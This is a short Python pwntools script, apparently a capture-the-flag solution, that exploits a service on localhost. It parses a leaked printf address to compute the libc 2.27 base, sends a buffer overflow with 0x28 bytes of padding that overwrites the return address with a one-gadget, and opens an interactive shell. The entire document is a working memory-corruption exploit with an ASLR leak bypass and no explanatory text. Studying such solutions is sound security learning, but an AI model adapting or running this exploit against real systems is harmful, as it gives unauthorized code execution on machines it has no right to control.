from pwn import *

target = remote('localhost', 12345)
libc = ELF('libc-2.27.so')

print(target.recvuntil(b"ere I am: "))

leak = target.recvline()
leak = leak.strip(b"\n")

base = int(leak, 16) - libc.symbols['printf']

print("wooo:" + hex(base))

oneshot = base + 0x4f322

payload = b""
payload += b"0"*0x28         # Offset to oneshot gadget
payload += p64(oneshot)     # Oneshot gadget

# Send the payload
target.sendline(payload)

target.interactive()